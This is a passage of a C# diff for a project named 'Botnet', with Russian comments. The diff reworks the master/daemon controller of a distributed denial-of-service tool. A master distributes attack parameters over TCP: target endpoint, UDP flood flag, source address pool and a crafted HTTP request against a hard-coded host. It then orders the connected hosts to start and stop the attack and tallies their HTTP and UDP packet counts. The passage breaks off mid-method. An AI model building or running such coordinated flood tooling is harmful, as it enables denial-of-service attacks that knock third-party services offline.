@@ -14,11 +14,11 @@ using SharpPcap.LibPcap;
 
 
 namespace Botnet
-//TODO: check new election
+//TODO: handle object disposed everywhere, indexes cheking
+//TODO: host leave message not shown when it should 
+//TODO: Something wrong with counters, looks like they are mixed
 {
-    //TODO: add new master choosing dialog
-    //TODO: check conncetion losing handler
-    //TODO: check states assigned
+
     sealed public class AttackParams
     {
         public IPEndPoint Target;
@@ -45,9 +45,16 @@ namespace Botnet
             //UdpFloodEnabled = true;
             //RestrictedPool = new NetworkInstruments.AddressPool(NetworkInstruments.getExternalIP(),NetworkInstruments.getExternalIP());
             //HttpMsg = "GET http://www.google.com/ HTTP/1.0\r\n\r\n";
-            Target = new IPEndPoint(Dns.GetHostAddresses("cinema.eastoffice.companyname")[0], 80);
+            try
+            {
+                Target = new IPEndPoint(Dns.GetHostAddresses("cinema.eastoffice.companyname")[0], 80);
+            }
+            catch (SocketException)
+            {
+                Target = new IPEndPoint(IPAddress.Any, 80);
+            }
             UdpFloodEnabled = true;
-            RestrictedPool = new NetworkInstruments.AddressPool(NetworkInstruments.getExternalIP(), NetworkInstruments.getExternalIP());
+            RestrictedPool = new NetworkInstruments.AddressPool(NetworkInstruments.getLocaIP(), NetworkInstruments.getLocaIP());
             HttpMsg = "GET http://cinema.eastoffice.companyname/index.php/ HTTP/1.1\r\n" +
                 "Host: cinema.eastoffice.companyname\r\n" +
                 "Connection: keep-alive\r\n" +
@@ -63,139 +70,78 @@ namespace Botnet
             Array.Copy(ParamsArray, 0, Targip, 0, 4);
             Array.Copy(ParamsArray, 7, rest1, 0, 4);
             Array.Copy(ParamsArray, 11, rest2, 0, 4);
-            Params.Target = new IPEndPoint(new IPAddress(Targip), BitConverter.ToInt16(ParamsArray, 4));
+            Params.Target = new IPEndPoint(new IPAddress(Targip), BitConverter.ToUInt16(ParamsArray, 4));
             Params.UdpFloodEnabled = Convert.ToBoolean(ParamsArray[6]);
             Params.RestrictedPool = new NetworkInstruments.AddressPool(new IPAddress(new byte[] { rest1[0], rest1[1], rest1[2], rest1[3] }), new IPAddress(new byte[] { rest2[0], rest2[1], rest2[2], rest2[3] }));
+            byte[] httpmsg = new byte[ParamsArray.Length - 15];
+            Array.Copy(ParamsArray, httpmsg, httpmsg.Length);
+            Params.HttpMsg = System.Text.Encoding.ASCII.GetString(httpmsg);
             return Params;
         }
         public byte[] GetBytes()
         {
             //target ip + port + udpmark+ restpool + http msg
-            byte[] res = new byte[15];
+            List<byte> res = new List<byte>(15);
             byte[] targetip = Target.Address.GetAddressBytes();
             byte[] port = BitConverter.GetBytes(Convert.ToUInt16(Target.Port));
             byte[] rpool0 = RestrictedPool[0].GetAddressBytes();
             byte[] rpool1 = RestrictedPool[1].GetAddressBytes();
-            for (int i = 0; i < 4; ++i)
-            {
-                res[i] = targetip[i];
-                res[i + 4] = port[i];
-                res[i + 7] = rpool0[i];
-                res[i + 11] = rpool1[i];
-            }
-            res[6] = Convert.ToByte(UdpFloodEnabled);
-            res.Concat(Encoding.ASCII.GetBytes(HttpMsg));
-            return res;
+            res.AddRange(targetip);
+            res.AddRange(port);
+            res.Add(Convert.ToByte(UdpFloodEnabled));
+            res.AddRange(rpool0);
+            res.AddRange(rpool1);
+            res.AddRange(Encoding.ASCII.GetBytes(HttpMsg));
+            return res.ToArray();
         }
     }
     sealed public class NetworkController
     {
         //on quit messages
         public bool mode { get; private set; }
-        sealed public class Daemon
+        sealed private class Daemon
         {
-            // daemon of the attack
-            public IPEndPoint IpEndPoint;
-            public ControllerState state;
-            public Daemon(IPEndPoint EndPoint, ControllerState initialState)
+            public TcpClient Client;
+            public Daemon(TcpClient handler)
             {
-                IpEndPoint = EndPoint;
-                state = initialState;
-
+                Client = handler;
+            }
+            public IPEndPoint RemoteIPEndPoint
+            {
+                get
+                {
+                    return (IPEndPoint)(Client.Client.RemoteEndPoint);
+                }
+            }
+            public override string ToString()
+            {
+                IPEndPoint point = (IPEndPoint)(Client.Client.RemoteEndPoint);
+                return point.Address + " " + point.Port; // return state + ip + port
             }
         }
-        private ControllerState state;
-
+        private volatile ControllerState state;
+        public NetworkInterface Adapter { get; private set; }
         public enum ControllerState : Byte
         {
             Suspending,
             Attacking,
             Tuning,
             Error,
-            Master
+            Master,
+            Election
             /*
            * attacking  1
            * suspending 0
            * tuning 2
            * error (no daemons, all daemons unavaibale, network unavaible) 3
-           * master 4
-           * need tuning 5  //deprecated exclude it
            */
         }
         private enum MessageCode : byte
         {
-            /// <summary>
-            /// Сигнал к началу атаки
-            /// </summary>
+            Params,
             StartAttack,
-            /// <summary>
-            /// Сигнал к завершению атаки
-            /// </summary>
             StopAttack,
-            /// <summary>
-            /// Запрос передачи параметров атаки
-            /// </summary>
-            DaemonHello,
-            /// <summary>
-            /// Ответ, содержащий параметры атаки 
-            /// </summary>
-            TuningInfo,
-            /// <summary>
-            /// Запрос отлючения режима мастера
-            /// </summary>
-            MasterOnRequest,
-            /// <summary>
-            /// Запрос ответа от мастера
-            /// </summary>
-            MasterEchoRequest,
-            /// <summary>
-            /// Запрос ответа от демона
-            /// </summary>
-            DaemonEchoRequest,
-            /// <summary>
-            /// Ответ от мастера
-            /// </summary>
-            MasterEchoAnswer,
-            /// <summary>
-            /// Ответ от демона
-            /// </summary>
-            DaemonEchoAnswer,
-            /// <summary>
-            /// Сигнал о том, что демон покидает атаку
-            /// </summary>
-            DaemonIdleRequest,
-            /// <summary>
-            /// Запрос статистических данных
-            /// </summary>
-            StatisticMessageRequest,
-            /// <summary>
-            /// Ответ, содержащий статистические данные
-            /// </summary>
-            StatisticMessageAnswer,
-            /// <summary>
-            /// Код подтверждения, сигнализирующий о том, что хост готов к атаке
-            /// </summary>
-            AttackAck,
-            /// <summary>
-            /// Сигнал о том, что мастер покидает атаку
-            /// </summary>
-            MasterIdleRequest,
-            /// <summary>
-            /// Подтверждение включения режима мастера
-            /// </summary>
-            MasterOnAck,
-            /// <summary>
-            /// Сигнал о начале выборов
-            /// </summary>
-            ElectionRequired,
-            /// <summary>
-            /// Информация для выборов
-            /// </summary>
-            ElectionInfo,
-            /// <summary>
-            /// Сброс результатов выборов
-            /// </summary>
-            ElectionReset
+            StatisticMessageRequest
 
         }
         private class DaemonList : List<Daemon>
@@ -205,36 +151,49 @@ namespace Botnet
                 // if do not exists return - 1, else index of the element in the list
                 /*
                  */
-                for (int i = 0; i < Count; ++i)
+                for (int i = 0; i < Count; ++i)           //prhps equals using here is necessary
                 {
-                    if ((this[i].IpEndPoint.Address.ToString() == TestSubject.Address.ToString()) && (this[i].IpEndPoint.Port == TestSubject.Port))
+                    if ((this[i].RemoteIPEndPoint.Address.ToString() == TestSubject.Address.ToString()) && ((this[i].RemoteIPEndPoint.Port == TestSubject.Port)))
                     {
                         return i;
                     }
                 }
                 return -1;
             }
-        }
 
-        private UdpClient Listener;
-        private UdpClient Sender;
+        }
         //private UdpClient Messenger;
         public delegate void CallBackFunct(string Message);
         public delegate void ChangeModeCallBack(bool mode);
-        public delegate void StatisticCallBack(int am);
-        public delegate void NoConnectionCallBack();
-        private int packetcounter;
+        public delegate void StatisticCallBack(int httpam, int udpam, int tothttp, int totudp);
+        public delegate void ErrorCallBack(string message);
         private CallBackFunct UpdateData;
         private ChangeModeCallBack ChangeMode;
-        private StatisticCallBack StatisticRespond;
-        private NoConnectionCallBack LostConnectionHandler;
+        private StatisticCallBack ProccessStatisticRespond;
+        private ErrorCallBack ExErrorHandler;
         private DaemonList Daemons; //for master mode
         private IPEndPoint Master; //for daemon mode
         private IPEndPoint MyPoint;
+        private TcpListener Server;
+        private TcpClient HostClient;
+        private Counter NetCounter;
+        private volatile bool AttackIsAllowed;
+        public IPEndPoint LocalIpEndPoint
+        {
+            get
+            {
+                return MyPoint;
+            }
+        }
+        public IPEndPoint MasterIpEndPont
+        {
+            get
+            {
+                return Master;
+            }
+        }
         //private NetworkInstruments.AddressPool RestrictedPool;
         private AttackController Core;
-        //private byte[] Params = new byte[12]; //params for attack
-        //private byte[] UnsetParams = new byte[12]; //default value targ addr, rest addr start, rest addr end
         public AttackParams Params
         {
             get
@@ -242,7 +201,7 @@ namespace Botnet
                 return Core.Params;
             }
         }
-        public int BroadcastPort { get; set; }
+        public int CurrentPort { get; set; }
         /*states:
          * attacking  1
          * suspending 0
@@ -251,197 +210,313 @@ namespace Botnet
          * master 4
          * need tuning 5
          */
-        public NetworkController(AttackParams Params, CallBackFunct StatisticCallBack, StatisticCallBack StatRespond, ChangeModeCallBack ModeChange, NoConnectionCallBack LostCOnnectionHandler, int alt_port) //master mode only
+        public NetworkController(AttackParams Params, NetworkInterface Adapter, CallBackFunct MessageCallBack, StatisticCallBack StatRespond, ChangeModeCallBack ModeChange, ErrorCallBack LostCOnnectionHandler, int alt_port, IPEndPoint MasterPoint) //master mode only
         {
-            UpdateData = StatisticCallBack;
-            this.StatisticRespond = StatRespond;
-            this.LostConnectionHandler = LostCOnnectionHandler;
+            UpdateData = MessageCallBack;
+            this.ProccessStatisticRespond = StatRespond;
+            this.ExErrorHandler = LostCOnnectionHandler;
             this.ChangeMode = ModeChange;
+            Daemons = new DaemonList();
             state = ControllerState.Tuning;
-            //IPEndPoint Target = new IPEndPoint(IPAddress.Parse(Target.ToString()), targ_port);
-            InitPort(alt_port);
-            InitParams(Params);
+            try
+            {
+                InitInterface(Adapter, alt_port, MasterPoint);
+                InitParams(Params);
+            }
+            catch (Exception err)
+            {
+
+                throw new Exception();
+            }
 
             // what if these sockets are occupied?
 
         }
-        public void InitPort(int al_port)
+        public bool isAttacking
         {
-            UpdateData("Применение параметров");
-            if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
+            get
             {
-                state = ControllerState.Error;
-                throw new Exception();
+                if (state == ControllerState.Attacking)
+                {
+                    return true;
+                }
+                else return false;
+
             }
+        }
+        public void ConnectToMaster()
+        {
+            if (!mode)
+            {
+                Close();
+                AttackIsAllowed = false;
+                state = ControllerState.Tuning;
+                HostClient = new TcpClient(MyPoint);
+                Thread ClientHandler = new Thread(new ParameterizedThreadStart(MaintaintHostConnection));
+                ClientHandler.Start(HostClient);
+
+            }
+
+        }
+        private void InitServer()
+        {
+            state = ControllerState.Tuning;
+            Server = new TcpListener(MyPoint);
+            Daemons.Clear();
+            NetCounter = new Counter();
+            Server.Start();
+            Server.BeginAcceptTcpClient(new AsyncCallback(ClientOnTryConnect), Server);
+        }
+        public void InitInterface(NetworkInterface Adapter, int al_port, IPEndPoint MasterPoint)
+        {
             if (state == ControllerState.Attacking)
             {
                 Stop();
             }
-            state = ControllerState.Tuning;
-            if (al_port != BroadcastPort)
+            if ((al_port != CurrentPort) || (Adapter.Id != this.Adapter.Id) || (MasterPoint != null && !MasterPoint.Equals(Master)))
             {
-                if (al_port != 0)
+                Close();
+                UpdateData("Инициализация клиентов");
+                try
                 {
-                    MyPoint = new IPEndPoint(NetworkInstruments.getLocaIP(), al_port);
-                    try
+                    CurrentPort = al_port;
+                    MyPoint = new IPEndPoint(NetworkInstruments.getAdapterIPAddress(Adapter), CurrentPort);
+                    this.Adapter = Adapter;
+                    if (MasterPoint == null)
                     {
-                        InitlClients(ref MyPoint, al_port);
+                        mode = true;
+                        InitServer();
+                        //ChangeMode(true);
                     }
-                    catch (SocketException err)
+                    else
                     {
-                        if (err.SocketErrorCode == SocketError.AddressAlreadyInUse)
-                        {
-                            throw new Exception(); //selected port is unavaible
-                        }
+                        Master = MasterPoint;
+                        mode = false;
+                        ConnectToMaster();
                     }
                 }
-                else
+                catch (SocketException err)
                 {
-                    MyPoint = new IPEndPoint(NetworkInstruments.getLocaIP(), 27000);
-                    try
+                    state = ControllerState.Error;
+                    if (err.SocketErrorCode == SocketError.AddressAlreadyInUse)
                     {
-                        InitlClients(ref MyPoint, 27000);
+                        UpdateData("Выбранный порт занят");
                     }
-                    catch (SocketException err)
+                    if (err.ErrorCode == (int)SocketError.AddressNotAvailable)
                     {
-                        if (err.SocketErrorCode == SocketError.AddressAlreadyInUse)
-                        {
-                            Sender.Client.Bind(new IPEndPoint(IPAddress.Any, 0));
-                            Listener.Client.Bind(new IPEndPoint(MyPoint.Address, ((IPEndPoint)(Sender.Client.LocalEndPoint)).Port)); //default port is unavaible to choosing random port
-                            MyPoint.Port = ((IPEndPoint)Listener.Client.LocalEndPoint).Port;
-                        }
+                        UpdateData("Не найдено интерфейса с таким адресом");
                     }
                 }
-                UpdateData("Start Scanning Lan");
-                Daemons = new DaemonList();
-                BroadcastPort = MyPoint.Port;
-                scanNetwork();  //what will hapen with old ones? we just leave them?
-                Listener.BeginReceive(new AsyncCallback(proccessMessage), null);
+                catch (ObjectDisposedException) { return; }
             }
+
+        }
+        private void ClientOnTryConnect(IAsyncResult res)
+        {
+            try
+            {
+                TcpListener Server = res.AsyncState as TcpListener;  ///////1111!!!1
+                TcpClient NewHost = Server.EndAcceptTcpClient(res);
+                int index = Daemons.Contains((IPEndPoint)NewHost.Client.RemoteEndPoint);
+                if (index == -1)
+                {
+                    Thread Handler = new Thread(new ParameterizedThreadStart(MaintainServerConnection));
+                    Daemons.Add(new Daemon(NewHost));
+                    NetCounter.addDevice();
+                    Handler.Start(NewHost);
+                }
+                Server.BeginAcceptTcpClient(new AsyncCallback(ClientOnTryConnect), Server);
+            }
+            catch (ObjectDisposedException)
+            {
+                return;
+            }
+        }
+        private void MaintainServerConnection(Object Params)
+        {
+            TcpClient Connection = Params as TcpClient;
+            int index = Daemons.Contains((IPEndPoint)(Connection.Client.RemoteEndPoint));
+            UpdateData(Daemons[index].ToString() + " Присоединился");   ///index!!!
+            //do we need to connect?
+            NetworkStream Stream = Connection.GetStream();
+            Connection.ReceiveBufferSize = 1000;
+            Connection.ReceiveTimeout = 200;
+            byte[] buffer = new byte[9];
+            while (Connection.Connected)
+            {
+                if (Connection.Available >= 9)
+                {
+                    Stream.Read(buffer, 0, 9);
+                    int Http = BitConverter.ToInt32(buffer, 1);
+                    int Udp = BitConverter.ToInt32(buffer, 5);
+                    NetCounter.addStat(index, Http, Udp);
+                    ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, Core.HttpCounter + NetCounter.getTotatHttp(), Core.UdpCounter + NetCounter.getTotalUdp());
+                }
+            } //handle disposed gere too
+            UpdateData(Daemons[index].ToString() + " Отсоединился");
+            NetCounter.removeDevice(index);
+            Daemons.RemoveAt(index);
+
+
+        }
+        private class Counter
+        {
+            private class device
+            {
+                public int http;
+                public int udp;
+                public device(int http, int udp)
+                {
+                    this.http = http;
+                    this.udp = udp;
+                }
+            }
+            List<device> devices;
+            public Counter(int n)
+            {
+                devices = new List<device>(n);
+            }
+            public Counter()
+            {
+                devices = new List<device>();
+            }
+            public void addDevice()
+            {
+                devices.Add(new device(0, 0));
+            }
+            public void addStat(int ind, int http, int udp)
+            {
+                devices[ind].http = http;
+                devices[ind].udp = udp;
+            }
+            public void removeDevice(int index)
+            {
+                devices.RemoveAt(index);
+            }
+            public int getDeviceHttp(int ind)
+            {
+                return devices[ind].http;
+            }
+            public int getDeviceUdp(int ind)
+            {
+                return devices[ind].udp;
+            }
+            public int getTotatHttp()
+            {
+                int tot = 0;
+                for (int i = 0; i < devices.Count; ++i)
+                {
+                    tot += devices[i].http;
+                }
+                return tot;
+            }
+
+            public int getTotalUdp()
+            {
+                int tot = 0;
+                for (int i = 0; i < devices.Count; ++i)
+                {
+                    tot += devices[i].udp;
+                }
+                return tot;
+            }
+        }
+        private void MaintaintHostConnection(Object Params)
+        {
+            TcpClient Connection = Params as TcpClient;
+            try
+            {
+                Connection.Connect(Master);
+                if (state != ControllerState.Suspending) state = ControllerState.Suspending;
+                UpdateData("Соединение с мастером установлено");
+                Connection.ReceiveBufferSize = 10000;
+                Connection.ReceiveTimeout = 100;
+                NetworkStream Stream = Connection.GetStream();
+                bool DataCollected;
+                while (Connection.Connected)
+                {
+                    DataCollected = false;
+                    if (Connection.Available >= 1)
+                    {
+                        int code = Stream.ReadByte();
+                        switch (code)
+                        {
+                            case 0:
+                                while (Connection.Connected && !DataCollected)
+                                {
+                                    if (Connection.Available >= 2)
+                                    {
+                                        byte[] buuf = new byte[2];
+                                        Stream.Read(buuf, 0, 2);                              //df to add length in sendservicemsg
+                                        UInt16 len = BitConverter.ToUInt16(buuf, 0);
+                                        while (Connection.Connected && !DataCollected)
+                                        {
+                                            if (Connection.Available >= len)
+                                            {
+                                                byte[] buffer = new byte[len];
+                                                Stream.Read(buffer, 0, len);
+                                                InitParams(AttackParams.parseFromArray(buffer));
+                                                state = ControllerState.Suspending;
+                                                DataCollected = true;
+                                                UpdateData("Получены настройки от мастера");
+                                            }
+                                        }
+
+                                    }
+                                }
+
+                                break;
+                            case 1:
+                                AttackIsAllowed = true;
+                                Start(); break;
+                            case 2:
+                                AttackIsAllowed = false;
+                                Stop(); break;
+                            case 3:
+                                List<byte> msgs = new List<byte>();
+                                msgs.Add(3);
+                                msgs.AddRange(BitConverter.GetBytes(Core.HttpCounter));
+                                msgs.AddRange(BitConverter.GetBytes(Core.UdpCounter));
+                                Stream.Write(msgs.ToArray(), 0, msgs.Count);
+                                //stats
+                                break;
+                        }
+                    }
+                }
+                UpdateData("Соединение с мастером разорвано");
+            }
+            catch (SocketException err)
+            {
+                UpdateData("Невозможно подключиться к мастеру"); //1060 exception
+                state = ControllerState.Error;
+
+            }
+            catch (ObjectDisposedException)
+            {
+                return;
+            }
+
+
         }
         public void InitParams(AttackParams Params) // change that crap to point!!
         {
             UpdateData("Применение параметров");
-            if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
-            {
-                state = ControllerState.Error;
-                throw new Exception();
-            }
             if (state == ControllerState.Attacking)
             {
                 Stop();
             }
             state = ControllerState.Tuning;
-            //byte[] newParams = new byte[12];
-
-            packetcounter = 0;
             if (Core != null)
             {
                 Core.Params = Params;
+                Core.Adapter = Adapter;
             }
             else
-                Core = new AttackController(Params); // temporary
-        }
-        private void InitlClients(ref IPEndPoint MyNewPoint, int port)
-        {
-            //perhaps need to close the old ones if they are opened?
-            IPEndPoint AnyPoint = new IPEndPoint(IPAddress.Any, port);
-            Sender = new UdpClient();
-            Sender.ExclusiveAddressUse = false;
-            Sender.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
-            Sender.Client.Bind(AnyPoint);
-            Listener = new UdpClient();
-            Listener.ExclusiveAddressUse = false;
-            Listener.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
-            Listener.Client.Bind(MyNewPoint);
-            Listener.Client.ReceiveTimeout = 3000;
-        }
-        private void DaemonEnabling() //if just need to become a host, and a new master is already choosed
-        {
-
-            if (state == ControllerState.Attacking) Stop();
-            state = ControllerState.Tuning;
-            SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.MasterIdleRequest); //13  check for exceed payload
-            mode = false;
-            state = ControllerState.Suspending;
-            //Params = UnsetParams;
-
-        }
-        private void MasterQuit()  //if master quiting and program shutdown
-        {
-            if (state == ControllerState.Attacking) Stop();
-            state = ControllerState.Tuning;
-            Listener.Close();
-            SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.ElectionRequired);
-            Sender.Close();
-        }
-        private void DaemonQuit()
-        {
-            if (state == ControllerState.Attacking) Stop();   //mb check if tunning or election in progress? during the election state will be tunning
-            if (state == ControllerState.Suspending) //what if one will quit during the election? send election reset broadcast
+                Core = new AttackController(Params, Adapter, CoreErrorHandler);
+            if (mode)
             {
-                SendServiceMessage(Master, MessageCode.DaemonIdleRequest);
+                state = ControllerState.Suspending;
             }
-            Listener.Close();
-            Sender.Close();
-        }
-        public void Close()
-        {
-            if (mode) MasterQuit();
-            else DaemonQuit();
-            if (Core != null) Core.Close();
-        }
-        //public void MasterEnabling()
-        //{
-        //    //if (!mode)
-        //    //{
-        //    //    UpdateData("Попытка перехода в режим мастера...");
-        //    //    SendServiceMessage(Master, MessageCode.MasterOffRequest);
-        //    //}
-        //}
-        private void scanNetwork()
-        {
-            mode = false;
-            IPEndPoint Broadcast = new IPEndPoint(IPAddress.Broadcast, BroadcastPort);
-            IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, BroadcastPort);
-            UpdateData("Поиск мастера");
-            SendServiceMessage(Broadcast, MessageCode.MasterEchoRequest);
-            bool Receiving = true;
-            while (Receiving)
-            {
-                try
-                {
-                    byte[] payload = Listener.Receive(ref RemoteIpEndPoint);
-                    if (!NetworkInstruments.pointsEqual(RemoteIpEndPoint, MyPoint))
-                    {
-                        parseMessage(RemoteIpEndPoint, payload);
-                    }
-                }
-                catch (SocketException)
-                {
-                    Receiving = false;
-                }
-            }
-            if (state == ControllerState.Tuning) //if no masters was found
-            {
-                UpdateData("Мастер не найден. Теперь я мастер");
-                MasterTuning();
-                state = ControllerState.Master;
-                mode = true;
-            }
-            ///*
-            //       main idea of first checking - we need to find master, if there is no one we are becoming master, send daemonecho, save endpoints of all who have responded
-            //        */
-
-
-            UpdateData("Карта сети обновлена");
-        }
-        private void MasterTuning()
-        {
-            IPEndPoint Broadcast = new IPEndPoint(IPAddress.Broadcast, BroadcastPort);
-            Daemons.Clear();
-            UpdateData("Поиск устройств...");
-            SendServiceMessage(Broadcast, MessageCode.DaemonEchoRequest);
         }
 
         /*
@@ -461,363 +536,146 @@ namespace Botnet
            12 - ready for attack ack
            13 - master idle request
          */
-        private bool SendServiceMessage(IPEndPoint Recipient, MessageCode code, params byte[] payload)
-        {
-            if (code == MessageCode.TuningInfo || code == MessageCode.StatisticMessageAnswer)   //update payload checking for new codes
-            {
-                if (payload.Length == 0) return false;
-            }
-            //sendmsg
-            byte[] datagram = new byte[1 + payload.Length];
-            datagram[0] = (byte)code;
-            if (payload.Length != 0)
-            {
-                for (int i = 0; i < payload.Length; ++i)
-                {
-                    datagram[i + 1] = payload[i];
-                }
-            }
-            try
-            {
-                Sender.Send(datagram, datagram.Length, Recipient);
-            }
-            catch (SocketException err)
-            {
-                //
-                if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
-                {
-                    state = ControllerState.Error;
-                    Sender.Close();
-                    Listener.Close();
-                    //callback for reinitiate
 
-                }
-                //if(err.ErrorCode == SocketError.HostNotFound || err.ErrorCode == SocketError.HostUnreachable ||
-                //err.ErrorCode == SocketError.NetworkDown || err.ErrorCode == SocketError.NetworkUnreachable)
-
-            }
-            return true;
-
-        }
         public void Start()
         {
-            if (state != ControllerState.Attacking)
+            if ((state != ControllerState.Error) && (state != ControllerState.Tuning))
             {
-
-                UpdateData("Начало атаки на /*add target address here*/");  //check do the corret params have been setted before!
-                if (mode)
-                {
-                    foreach (Daemon Machine in Daemons)
-                    {
-
-                        //how to start attack, we should                                         //send settings to hosts
-                        SendServiceMessage(Machine.IpEndPoint, MessageCode.TuningInfo, Params.GetBytes());  //when received async attack ack answer, send start command
-                    }
-                }
-                Core.start();
-                state = ControllerState.Attacking;
-
-            }
-        }
-
-        public void Stop()
-        {
-            if (state != ControllerState.Suspending)
-            {
-                UpdateData("Остановка атаки...");
-                if (mode)
-                {
-                    foreach (Daemon Machine in Daemons)
-                    {
-                        if (Machine.state == ControllerState.Attacking)
-                        {
-                            SendServiceMessage(Machine.IpEndPoint, MessageCode.StopAttack);
-                        }
-                    }
-                }
-                else
-                {
-                    SendServiceMessage(Master, MessageCode.DaemonIdleRequest);  //does it needed?
-                }
-                Core.stop();
-                state = ControllerState.Suspending;
-            }
-        }
-        private void proccessMessage(IAsyncResult res)
-        {
-            IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 27000);
-            try
-            {
-                byte[] payload = Listener.EndReceive(res, ref RemoteIpEndPoint);
-                if (!NetworkInstruments.pointsEqual(RemoteIpEndPoint, MyPoint))
-                {
-                    parseMessage(RemoteIpEndPoint, payload);
-                }
-            }
-            catch (SocketException err)
-            {
-                if (err.ErrorCode == (int)SocketError.ConnectionReset)  //icmp destination unreachable
+                if (!Core.State)
                 {
                     if (mode)
                     {
-                        //exclude source machine from attack optimize
-                        UpdateData("Хост " + RemoteIpEndPoint.Address.ToString() + " покинул сеть");
-                        int index = Daemons.Contains(RemoteIpEndPoint); //check does our list contain this dude
-                        if (index != -1)
-                        {
-                            Daemons.RemoveAt(index);
-                        }
+                        SendServiceMessage(MessageCode.Params, Params.GetBytes());
+                        SendServiceMessage(MessageCode.StartAttack);
+                        UpdateData("Начало атаки на" + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
+                        Core.start();
+                        state = ControllerState.Attacking;
                     }
                     else
                     {
-                        //master is idle need to re config
-                        if (state == ControllerState.Attacking) Stop();
-                        beginElection();
-                    }
-                }
-            }
-            catch (ObjectDisposedException)
-            {
-                return;
-            }
-
-            Listener.BeginReceive(new AsyncCallback(proccessMessage), null);
-            //UpdateData(); // check it
-        }
-        private void parseMessage(IPEndPoint RemoteIpEndPoint, byte[] payload)
-        {
-            //invoke check?
-            //functions that are called from here, provide invoke for them
-
-            if (mode)
-            {
-                switch (payload[0])
-                {
-                    case (byte)MessageCode.DaemonHello: //daemonhello
-
-                        //if machine with the same address in our list
-                        //send settings
-                        //UpdateData("Получен запрос настройки от " + RemoteIpEndPoint.Address.ToString() + " Отправляю данные..");
-                        int index = Daemons.Contains(RemoteIpEndPoint); //check does our list contain this dude
-                        if (index == -1) //if it not contains it add
+                        if (AttackIsAllowed)
                         {
-                            Daemon New = new Daemon(RemoteIpEndPoint, ControllerState.Tuning);
-                            Daemons.Add(New);
+                            Core.start();
+                            UpdateData("Начало атаки на" + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
+                            state = ControllerState.Attacking;
                         }
-                        // if yep send
-                        //SendServiceMessage(RemoteIpEndPoint, MessageCode.TuningInfo, Params);
-
-                        ; break;
-                    case (byte)MessageCode.DaemonIdleRequest: //daemon idle request
-
-                        //exclude source machine from attack
-                        UpdateData("Хост " + RemoteIpEndPoint.Address.ToString() + " покинул сеть");
-                        index = Daemons.Contains(RemoteIpEndPoint); //check does our list contain this dude
-                        if (index != -1) //if contains send params
-                        {
-                            Daemons.RemoveAt(index);
-                        }
-                        ; break;
-                    case (byte)MessageCode.AttackAck: //daemon idle request
-                        //exclude source machine from attack                        
-                        index = Daemons.Contains(RemoteIpEndPoint); //check does our list contain this dude
-                        if (index != -1)
-                        {
-                            UpdateData("Хост " + RemoteIpEndPoint.Address.ToString() + " готов к атаке");
-                            Daemons[index].state = ControllerState.Suspending;
-                            SendServiceMessage(RemoteIpEndPoint, MessageCode.StartAttack);
-                        }
-                        ; break;
-
-                    case (byte)MessageCode.StatisticMessageAnswer: //stat msg answer
-
-                        int N = BitConverter.ToInt32(payload, 1);
-                        packetcounter += N;
-                        StatisticRespond(packetcounter);
-
-                        ; break;
-                    case (byte)MessageCode.MasterEchoRequest: //master echo request
-                        UpdateData("Хост " + RemoteIpEndPoint.Address.ToString() + " ищет мастера. Отвечаю");
-                        SendServiceMessage(RemoteIpEndPoint, MessageCode.MasterEchoAnswer);
-                        int i = Daemons.Contains(RemoteIpEndPoint); //check does our list contain this dude
-                        if (i == -1) //if contains send params
-                        {
-                            Daemon Newbie = new Daemon(RemoteIpEndPoint, ControllerState.Tuning);
-                            Daemons.Add(Newbie);
-                        }; break;
-                }
-            }
-            else
-            if (NetworkInstruments.pointsEqual(RemoteIpEndPoint, Master))
-            {
-                switch (payload[0])
-                {
-                    case (byte)MessageCode.StartAttack: //start attack
-                        UpdateData("Принят сигнал о начале атаки");
-                        Start();
-                        ; break;
-                    case (byte)MessageCode.StopAttack: //stop attack
-                        UpdateData("Принят сигнал об остановке атаки");
-                        Stop();
-                        break;
-                    case (byte)MessageCode.TuningInfo: //tuning info
-
-                        if (payload.Length > 1)
-                        {
-                            //set config
-                            UpdateData("Приняты настройки от мастера");
-                            byte[] ReceivedParams = new byte[payload.Length - 2];             //params should be setted to the core!
-                            Array.Copy(payload, 1, ReceivedParams, 0, ReceivedParams.Length);
-                            SendServiceMessage(RemoteIpEndPoint, MessageCode.AttackAck);
-                            state = ControllerState.Suspending;
-                            Core.Params = AttackParams.parseFromArray(ReceivedParams);
-                        }
-                        break;
-                    case (byte)MessageCode.MasterEchoAnswer:
-                        if (state == ControllerState.Tuning)
-                        {
-                            UpdateData(RemoteIpEndPoint.Address.ToString() + "говорит что он мастер");
-                            mode = false;
-
-                            //SendServiceMessage(Master, MessageCode.DaemonHello);
-
-                        }
-                    ; break;
-                    case (byte)MessageCode.MasterIdleRequest:
-                        UpdateData("Мастер покидает атаку, ожидание нового мастера");
-                        //Params = UnsetParams;
-                        Master = new IPEndPoint(IPAddress.Any, BroadcastPort);
-                        state = ControllerState.Tuning;
-                        ; break;
-                    case (byte)MessageCode.MasterOnRequest:                               //send signal for master discarding
-                        SendServiceMessage(RemoteIpEndPoint, MessageCode.MasterOnAck);
-                        MasterTuning();
-                        break;
-                    case (byte)MessageCode.StatisticMessageRequest:
-                        //answer with stats                        
-                        SendServiceMessage(RemoteIpEndPoint, MessageCode.StatisticMessageAnswer, BitConverter.GetBytes(Core.Counter));
-                        break;
-                    case (byte)MessageCode.MasterOnAck:
-                        DaemonEnabling();
-                        break;
-
-                }
-            }
-            else
-            {
-                switch (payload[0])
-                {
-                    case (byte)MessageCode.DaemonEchoRequest: //daemon echo request
-                        UpdateData("Хост " + RemoteIpEndPoint.Address.ToString() + "ищет демонов, отвечаю");
-                        SendServiceMessage(RemoteIpEndPoint, MessageCode.DaemonHello);
-                        ; break;
-
-
-                    case (byte)MessageCode.MasterEchoAnswer:
-                        UpdateData(RemoteIpEndPoint.Address.ToString() + " говорит что он мастер");
-                        if (state == ControllerState.Tuning)
-                        {
